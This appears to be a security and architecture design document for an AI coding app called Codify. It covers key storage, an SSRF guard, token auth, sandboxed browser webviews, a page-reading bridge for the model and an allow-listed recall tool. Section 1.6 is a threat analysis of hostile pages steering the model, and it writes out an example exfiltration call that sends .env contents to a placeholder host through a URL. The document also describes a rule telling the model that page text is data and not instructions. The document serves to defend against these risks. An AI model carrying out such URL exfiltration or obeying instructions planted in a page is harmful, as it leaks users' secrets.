# Codify — Security, Persistence & Roadmap (v2)

## 1. Security additions for the multi-agent/multi-provider system

### 1.1 API key storage

- Raw keys are NEVER persisted by the Engine in plaintext and NEVER echoed back in any API response — only `api_key_ref` (a keychain handle) is returned.
- Engine: Python `keyring` (macOS Keychain / Windows Credential Manager / Linux Secret Service) under `codify/agents/{role}` and `providers/{slug}`.
- Where no usable keyring exists (headless Linux, no Secret Service, `keyring` not installed), keys go to `~/.codify/secrets.json` at mode `0600` instead — still never SQLite, still never returned by the API. `GET /settings/keys` reports `storage` so the UI states which store is in use rather than promising a keychain it does not have. See `04` §7.
- Desktop: key typed into `ApiKeyField`, held in component state, sent once over the loopback HTTP call, dropped immediately after. NEVER written into `localStorage`, Tauri's store plugin, or logs.

### 1.2 Local-provider SSRF guard

`AgentConfig.base_url` (used only when `provider == "local"`) MUST be validated against an allowlist before every request:

```python
def validate_local_base_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.hostname not in ("127.0.0.1", "localhost"):
        raise ValueError("Local provider base_url must point at localhost")
    if parsed.scheme != "http":
        raise ValueError("Local provider must use http (loopback only)")
```

Without this, a malicious or careless `base_url` could turn Coder/Tester/etc. into an SSRF vector against internal network services.

### 1.3 Engine–Desktop auth token

On boot, the Engine generates a random token, writes it to stdout, and requires `Authorization: Bearer <token>` on every request. Desktop reads it from the child process stdout when it spawns the Engine and attaches it to every `BackendClient` call — including `/settings/agents/*`, the most sensitive routes (attacker-controlled local `base_url`, key-reference overwrite).

The token is created once per state directory and persisted at `<state dir>/boot_token` (`0600`), not rotated per spawn: a client holding it then survives an engine restart, which per-spawn rotation broke for every client that could not re-read the handshake itself. `CODIFY_BOOT_TOKEN` overrides the value for a caller that wants a per-process token. Lifetime, and what a longer-lived credential costs, are in `04` §6.

The UI holds the token **in memory** when it runs under the desktop shell: it asks the shell for the engine's port and token on every health probe (`codify_get_engine_info`), so nothing needs it at rest, and a copy in the webview's `localStorage` would be a second, less protected home for a credential whose file is `0600`. An older build's stored copy is deleted on load. Only the standalone browser preview, which has no shell to ask, still keeps a pasted token in `localStorage` (`ui/src/api.ts`, `StaleAuthBanner`).

### 1.4 Retained from v1

- Command allowlist in `SandboxService` — additionally per-agent-scoped: only the Tester Agent's proposed commands ever reach `SandboxService.run_command`, never Coder or Planner raw output.
- Per-command argument policies (not `cmd[0]` only): e.g. `python` only with `-m pytest` / script-path-inside-workspace.
- `FileSystemService` path containment (`root_path` boundary check).
- Engine binds to `127.0.0.1` only.

### 1.5 Embedded browser: deny-by-default webviews

The workspace shell's browser (`src-tauri/src/browser.rs`) is the first surface in Codify that renders untrusted content. Its isolation has four layers, and the first three are asserted by Rust tests in that file rather than assumed:

- **Empty capability set.** `src-tauri/capabilities/browser.json` covers the `browser-*` webview labels with an empty `permissions` list. `browser.rs::the_browser_capability_set_is_empty` parses the committed capability files and fails if any permission reaches a browser label — through `browser.json` itself, a widened `*` pattern in any other capability, or an inline capability added to `tauri.conf.json` (`tauri_conf_inlines_nothing_for_browser_webviews`). The file must also exist and must match a label built by `webview_label`, so the declaration can neither be silently absent nor silently out of sync with the labels in use.
- **Loopback URL guard, on every navigation.** Only `http`/`https`, and never a loopback/unspecified host: `localhost`, `*.localhost` (which covers Windows' `http://tauri.localhost`), all of 127/8, `::1`, `0.0.0.0`, `::`, IPv4-mapped IPv6 spellings, and the integer/hex/octal forms the WHATWG parser canonicalises (`http://2130706433/` is 127.0.0.1). Checked in `open`/`navigate` before anything exists, and again by `WebviewBuilder::on_navigation` for every navigation the page attempts, redirects included. This is §1.2's rule inverted: a local provider *must* point at loopback, a browser page *must not* be able to reach it.
- **An app ACL manifest, so the first layer has something to deny with.** Tauri enforces capabilities against application commands (`codify_*`) — not just plugin and core commands — only when the app defines an ACL manifest. With none defined it lets a **local**-origin invoke of any `codify_*` command through unchecked, where local means relative to the `devUrl` or the app's own assets (`tauri://localhost`, `http://tauri.localhost`). That pass is what `src-tauri/permissions/shell.json` closes: one `allow-` permission per `codify_*` command, collected into a `shell` set referenced by `capabilities/default.json` and by nothing else — and that file's `windows` is `["main"]`. Every app invoke is now resolved against the calling label whatever its origin, so a `browser-*` label resolves to nothing. Asserted by `the_app_acl_manifest_closes_the_local_origin_bypass` (the flag Tauri reads, through Tauri's own resolver), `the_grant_reaches_main_and_no_browser_label` and `the_app_manifest_is_referenced_by_exactly_one_capability`.
- **The origin guard, now defence in depth.** Remote-origin invokes were always rejected unless an explicit `remote` capability resolved them, and this app configures none. With layer 4 in place the loopback refusal is no longer the only thing between a page and `codify_get_engine_info`: navigating onto `http://localhost:5173` or `tauri://localhost` gains a page nothing (§1.3, `00` §6.3), but still seats untrusted content where the app's own scripts run, and the two checks fail independently. Keeping the guard costs nothing and keeps that independence.

Two things about that container are worth stating here, because both were
mistaken for a rendering bug and neither is a security matter. Tauri builds
**every** webview into the window's default `gtk::Box`, and wry's box branch
packs a child expand-and-fill without reading the bounds it was handed — so a
page took a *share of the window* (half of Codify, then all of it) rather than
the pane's rectangle, while the UI reported the right one. And the commands
that seat a page are `async`, so they run on a tokio worker, which is not the
thread GTK will take a widget call on. `browser.rs`'s `page_layer` module now
owns both: a `gtk::Overlay` + `gtk::Fixed` of its own that a page can sit
*inside*, and one door (`on_main`) that asks the toolkit's own question before
every widget call. `09` §7.3 has the mechanism and the measurement; the point
for this section is that neither fact touches a capability, a guard or a
token — a page is still a page with an empty capability set, whatever rectangle
it is painted in.

The UI half is `docs/09` §7.3, and the page *is* embedded now — which is exactly why the grant is no longer keyed on `windows: ["main"]`. A child webview reports its parent's window label, so a window-matched grant would be inherited by every page seated in the window; `capabilities/default.json` matches on `webviews: ["main"]` and `capabilities/browser.json` on `webviews: ["browser-*"]`, and `browser.rs::no_capability_grants_through_a_window_pattern` fails the build if any capability that grants anything ever matches through a `windows` pattern again. Tauri resolves a capability with an *or* across `windows` and `webviews` patterns, so matching on `webviews` alone is what keeps the child outside the grant.

Honest limits: this is a navigation policy, not a network filter — subresource requests to loopback are not intercepted (they cannot reach an engine route without the bearer token, which a `browser-*` label cannot invoke for), and a DNS name that *resolves* to loopback (`127.0.0.1.nip.io`) passes a lexical guard by construction. The capability set is the boundary that does not care what the host resolves to, and the app ACL manifest is what makes that set mean anything. The manifest gates Tauri's `invoke` surface only; the engine subprocess, the PTYs and the webviews are all created from Rust, where no capability reaches them. The browser pane's one remaining escape is granted to the app's webview alone and does not widen the page: DevTools is a shell-side inspector over the webview, and a page cannot even open its own. **There is no open-external control any more**: handing the page's URL to the OS opener is the one escape that leaves the app entirely, so it was removed rather than guarded, and `browser.rs`'s `the_only_escape_is_the_inspector_and_the_module_spawns_nothing` fails the build if `open_external`, `open::that_detached` or a `codify_browser_open_external` command comes back. The crate that served it is gone too — `the_open_crate_is_not_a_dependency_and_nothing_reaches_for_it` reads `Cargo.toml` *and* every file under `src/`, because a command can be removed from every source file while the dependency that fed it keeps pulling `windows-sys` and `is-wsl` into the build graph, and no leg of the gate calls an unused dependency an error. See `09` §7.2 for the built surface.

The page also declares who it is, and that was a lie until recently. wry's WebKitGTK default announced `Version/60.5 Safari/605.1.15` — Safari 15.4, released in 2022, with Apple's build number for it — on a WebKitGTK 2.52 engine. `browser::page_user_agent` now sends `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Codify/<version>`, keeping the `AppleWebKit` token because the engine really is WebKit and it is the one token every parser already looks for. The point of saying so is that a site can now tell it is talking to something that is not pretending, and the measured claim is narrow: across four sites, two runs each and three strings — the honest one, wry's Safari default, and Chrome — **no site behaved differently** (`09` §7.4). The string was a true statement and a red herring. `CODIFY_PAGE_USER_AGENT` replaces it wholesale for every page, which is what makes that comparison possible at all, and it is an env var rather than a setting because it cannot be persisted by accident and is visible in the process listing; empty falls back to the honest default. `an_override_replaces_the_whole_string_and_nothing_else` pins that a comparison cannot quietly send a string no page ever saw.

### 1.6 The AI reads the page, and can move the tab — and the page still has nothing

The bridge in `engine/webview_bridge.py` and `src-tauri/src/webview_bridge.rs` lets the model read the tab the user is looking at, and follow a link off it. It is the first thing in this codebase that deliberately hands untrusted web content *to* a model, so it is worth being exact about what crosses and what does not.

A page can reach exactly one channel: `codify-bridge://reply/<id>/<seq>/<last>/<chunk>`, served by `webview_bridge::scheme_handler`. It needs no capability, which is the point — a custom scheme is not the network and not a Tauri command, so it is the one reply path a page with an empty capability set can reach at all. What travels on it is **text, and nothing else**: no boot token, no command name, no path, no argv. `webview_bridge::this_module_does_not_grant_a_browser_page_anything` scans the module for the three things it must never name.

Four properties hold it together, and each is asserted rather than intended:

- **A page can only answer a question this process asked.** `deliver` accepts a chunk only for an id in the pending set, only at the sequence number it expects next, and only once. A page can fetch the reply URL as often as it likes; a wrong id, a resend or an out-of-order chunk is dropped. Engine-side, `WebviewBridge.answer` refuses any id it did not issue.
- **The channel works, which is a measured fact rather than an intended one.** It did not, for as long as the bridge existed: `open_tabs` reached pages through `app.get_webview_window("main")`, which returns `None` from the moment the first page is seated (tauri defines a webview window as one with *no* child webviews), and every script then threw `ReferenceError` on its first line because the request id and the scheme were interpolated as bare words rather than literals. The shell reported "there are no browser tabs open" about an app with one open, and the only evidence anything was wrong was the page's own console. Both lookups now go through the manager, both values are JSON-escaped, and `every_value_the_template_interpolates_is_a_literal_and_not_a_bare_word` checks all six interpolations in all three scripts — a shape check is not enough, because `smoke0001` was always a well-formed id and only its JavaScript *literal* was wrong. `make smoke-embed` now exercises the round trip for real: `example.org` and `youtube.com` answer over the scheme, and a site whose CSP forbids all three channels (`reddit.com`) fails the run rather than passing it.
- **What comes back is typed down before the model sees it.** `_clean_result` keeps six named fields and drops everything else, so a page cannot introduce a key the formatter treats as something other than text, and the text is capped on both sides of the process boundary.
- **It is labelled as a website's words.** `format_page` tells the model, in the same breath as the text, that it is data about a site and not instructions — the one place a reader might otherwise mistake a page for a command.
- **Navigation goes round the guard, never through it.** `navigate_page` lets the model move a tab, and it does so through `browser::navigate` — *the same function* `codify_browser_navigate` calls for a user's click. The model proposes an address; `parse_navigation` decides, in Rust, on the address that arrives in the shell, and the page's redirects are guarded again by `on_navigation` afterwards. This module contains no host check of its own, and `webview_bridge::a_model_proposed_url_goes_through_the_guard_and_not_a_copy_of_it` fails the build if one appears — a second copy of the loopback rule is a second rule to get wrong. The engine's side is a *pre-filter*, not a guard: it refuses a URL that is not http(s) or is absurdly long, because that is a round trip not worth making, and `navigate` says so in its own docstring.
- **Navigation cannot escalate the model's authority, and it is not an egress guard.** A destination is another page in the same embedded webview: no capability, no engine access, no boot token. That is the *whole* of the claim. This bullet used to continue "so the worst a hostile page can talk the model into is showing the user a different page — which it could already do by navigating itself", and that was false in the one way that matters here: **a page cannot read the workspace, and the model can.** `navigate_page` takes the address from the model, `parse_navigation` admits any public http(s) URL, and nothing in between can tell a destination from a destination used as a payload — so `navigate_page("https://elsewhere.example/?d=<contents of .env>")` is a one-call way out of the machine for anything the turn has read, needing no approval, with nothing in the transcript but the address. The guard decides *where* a navigation may go; it cannot decide whether the address is carrying data out, because the address **is** the payload. The same holds for `type_page` into a field a page watches, and for `click_page` on a submit control after it. The surface to reason about is the model's *read* capability crossed with these three tools, not the page's attention — and every navigation is still announced in the turn's transcript (`conductor moved <tab> to <url>`) before it happens, because it is the one bridge tool whose effect is visible.
- **New tabs are not on offer.** `browser::open` needs the content rectangle the UI measures and owns, so a tab the bridge invented would have no geometry. `resolve_tab` refuses with the list of open tabs instead.
- **Acting on a page is the page's own event, and the report is the page's own claim.** `click_page` and `type_page` eval a script in the page and wait for it to answer over the same one-directional scheme; there is no second channel and no capability, so a page gains nothing by refusing. What comes back is deliberately narrow: `click_script` refuses a disabled control rather than reporting a click that would have done nothing, and `type_script` refuses a `<div>`, a checkbox or a radio rather than pretending a field was filled. Neither claims an outcome — a click is "this element was clicked", not "the page went there" — and `_clean_action` keeps only the fields `format_action` already prints, falling back to the selector the engine asked for so a bare `{"ok": true}` is still tied to an action. The one verb that writes is the one whose wording is most careful: a typed result says *which button it pressed* (none) and refuses to promise the text stayed put — "a page may send what it is given as you type" — because the failure mode is a model telling a user it signed in, and "nothing was submitted" was a claim the engine was not in a position to make.
- **The model cannot name its own operation.** `op` is a fixed string chosen in `engine/webview_bridge.py` and matched in `webview_bridge::serve`; an op the shell does not know is refused with a sentence naming it, so a version mismatch is diagnosable rather than silent. `webview_bridge::serve_routes_the_four_verbs_and_nothing_else` pins that the three page verbs share one route, because a `click` that reached no match arm would be refused as an unknown operation.

Honest limits: a page whose Content-Security-Policy forbids `connect-src`, `img-src` and `sendBeacon` can reach no channel at all, and the read then reports that as the reason rather than as a blank page (the script tries all three for exactly this reason). A page *can* lie about what it contains — which is what a page is — and that is why the model is told the text is untrusted. A page can also name a link, and the model can follow it; links are filtered to http(s) at the page and again in the engine, but a link to a hostile site is a link to a hostile site, and that is now a thing a turn can do to a user. And the bridge widens nothing about who can reach the engine: the engine's routes require the bearer token, which a `browser-*` label has no way to invoke for.

**The empty capability set is load-bearing in a place that is easy to get wrong: a page cannot tell the app anything.** This is not a policy line, it is a measurement — the embedded first-paint smoke (`09` §7.4) originally had the page announce a paint by calling `__TAURI_INTERNALS__.invoke("plugin:event|emit_to", …)`, and the invoke was refused, because `emit_to` is an ACL-governed command and a `browser-*` label resolves to no permissions. The smoke then reported a 20s first-paint timeout on a machine where the page had painted in 0.9s and all four environment diagnostics read healthy — an instrumentation bug that reads exactly like a rendering bug. The page now marks the paint in its own document title, which needs no permission, and the shell's existing `on_document_title_changed` hook turns that into an event. The rule generalises: **anything a page is expected to do must be reachable with no capability at all**, and `browser.rs`'s `the_paint_script_announces_the_event_the_lib_listens_for` fails the build if the smoke script grows an `invoke` back. The deeper point for a reviewer is that a *denied* invoke is silent from the app's side, so an empty capability set shows up as a feature that mysteriously does nothing rather than as an error — which is why the browser's own test surface is a real run and not more capability assertions.

### 1.7 Commit scope

A step commits only the paths it wrote: `git commit -m <msg> -- <paths>`, staged with the same pathspec.
The engine never runs a bare `git add -A`, so a working tree with the user's own staged or half-finished
work is not swept into a commit named after the step, and their index is left as they left it. A step whose
proposal matched the file already commits nothing and says so (`04` §3.0).

### 1.8 Recall: the engine's own history, allow-listed (`built`)

`recall` is the conductor tool that answers *has this happened here before, and did we get past it?* It is
the first path by which **stored** content reaches a model's context — everything before it was read live
off disk or received over the bridge — so its containment is an allow-list, not a filter.

- **What may be recalled is enumerated, not described.** `RECALLABLE` in `engine/recall.py` names the event
  types recall reads and, per type, the named payload fields. Everything absent is unreachable no matter
  what is in the table — the query itself filters by the allow-list's keys, so a type left out is never
  even fetched. Two types are excluded deliberately: `diff` is file content and `library_evidence` is text
  a librarian read off a cloned repository. A tool that returns those would be the *easiest* way to put
  third-party text in front of a model, and it would arrive labelled "my own past history" — more
  persuasive than the same string arriving labelled "a file you just read". Recall grants nothing
  `read_file` does not already grant; what it manages is *salience*, not access.
- **Inside a recallable type, only the named fields are read.** A payload key the allow-list does not name
  for that type is never searched and never returned, so an `error` row carrying a `trace` field cannot
  smuggle it past the projection.
- **Log rows are gated by level.** `log` recalls only `warn`/`error` — the chattiest prose in the store is
  not what the tool is for, and a refusal usually lands in a log line with its reason attached.
- **The workspace scope is in the join.** `GoalService.recall_events` scopes with `WHERE g.workspace_id = ?`
  over a `JOIN` on goals. Filtering in Python would have *read* another workspace's rows to decide to
  discard them; the join never reads them at all.
- **The answer is bounded and labelled.** The scan is capped (`MAX_SCAN_EVENTS`), matches are capped and
  newest-first (`MAX_MATCHES`), every field is clipped (`MAX_FIELD_CHARS`), and a query shorter than
  `MIN_QUERY_CHARS` matches nothing. `format_recall` tells the model what it is holding — *recorded
  outcomes, not evidence about the current code* — and an empty result says it is an absence, not a proof
  it never happened (the scan covers the most recent 2 000 events, not all of history).
- **Recovery is inherited, not re-decided.** Which failures a retry later got past is answered by
  `engine.metrics.recovered_steps` — the same definition the statistics screen shows. A second
  implementation in `recall` would be a second answer to one question, and they would eventually disagree.
  It is computed over every scanned row, not just the matches, because the `fix_retry` that proves
  recovery is evidence and not itself a match.
- **The thread grain (`recall_threads`) reads a coarser unit on purpose.** It returns thread names,
  the workspace's recent asks (goal descriptions, clipped in the query), and run-outcome counts —
  never transcript bodies, never `turn_history`'s replies, never another workspace's threads (the
  scope is the same `WHERE c.workspace_id = ?`, and archived threads are excluded the way the tab
  list excludes them). What is exposed is what a new conversation needs — that the question was
  asked before, by whom, and how the runs ended — and nothing more granular than that.
- **Labels are asserted in tests.** `tests/test_recall.py` pins the exclusions by name, the log-level gate,
  the workspace join, the bounds, and the wording of the honesty labels.

## 2. Persistence layer

Single file. **No `agents.db`.**

```
~/.codify/codify.db   # workspaces, goals, plan_steps, events, agent_configs
~/.codify/boot_token  # loopback bearer token, owner-only (0600), created once per state dir
~/.codify/secrets.json  # only when no OS keyring is usable (0600)
```

`CODIFY_HOME` (or `CODIFY_DB` / `CODIFY_SECRETS`) redirects these, and a redirected run also stops using
the OS keychain so it cannot reach the real store — `04` §2.0, `04` §7. The test suite holds itself to
the same rule (`tests/hermetic.py`), and `make run-engine-scratch` does it for a manual smoke test.

- SQLModel maps Pydantic models in `04` §1.
- `update_goal` is check-and-increment; `409` `version_conflict` on miss.
- `agent_configs` seeded with `DEFAULT_AGENTS`; never deleted at runtime.

## 3. Updated phased roadmap

### Phase 0 — Skeleton (persisted from day one)

- `WorkspaceService`, `GoalService`, `EventBus` backed by SQLite (not in-memory).
- Basic FastAPI endpoints + Engine boot token auth.
- `ExecutorService` with hard-coded steps, no agents yet.
- Desktop: workspace selection, goal creation, log streaming.

### Phase 1 — Sub-agent system (core of this revision)

- `AgentConfig` model + SQLite table + 5 seeded defaults.
- `BaseProvider` + Anthropic/OpenAI adapters (Google/local can follow).
- `AgentRegistryService`, `ProviderFactory`, `AgentOrchestrator`.
- `/settings/agents` API (list, get, update, test-connection).
- Desktop: Settings → Agents (only editor); `agent_assigned` → read-only badges elsewhere.
- `PlannerService` and `ExecutorService` refactored to `orchestrator.run_agent(role, ...)` instead of a single `LLMService`.

### Phase 2 — Git, diffs, Reviewer Agent

- Full `GitService`.
- Reviewer Agent phase between "apply changes" and "finalize step" — MAY send a step back to `FAILED`/`IN_PROGRESS` with change requests. MUST NOT auto-rerun Coder; Desktop click restarts the step.
- Diff view + "Approve changes" / "Commit" flow in Desktop.

### Phase 3 — Local provider + polish

- `LocalProvider` (Ollama) with the SSRF allowlist from §1.2.
- Google provider adapter.
- Per-agent cost/latency stats on Agents settings cards (last response time, last error).
- Filterable logs, per-step detail, dry-run indicator throughout.

## 4. Settled defaults

| Topic | Decision |
|---|---|
| `system_prompt_override` | Free-text, **32768** chars. Blank → `NULL` / `DEFAULT_PROMPTS`. |
| Reviewer → Coder | Human click: `POST /goals/{id}/steps/{step_id}/retry`. No auto-loop. |
| `max_calls_per_goal` | Not on `AgentConfig`. Tester: at most one argv run + one verdict call per step attempt. |
| SQLite path | `~/.codify/codify.db` — or `CODIFY_DB` / `CODIFY_HOME`, resolved in `engine/home.py` only. |
| Redirected run | Never touches the real keychain (`04` §2.0). |

Argv table, WS/auth handshake, HTTP catalog: `04`.
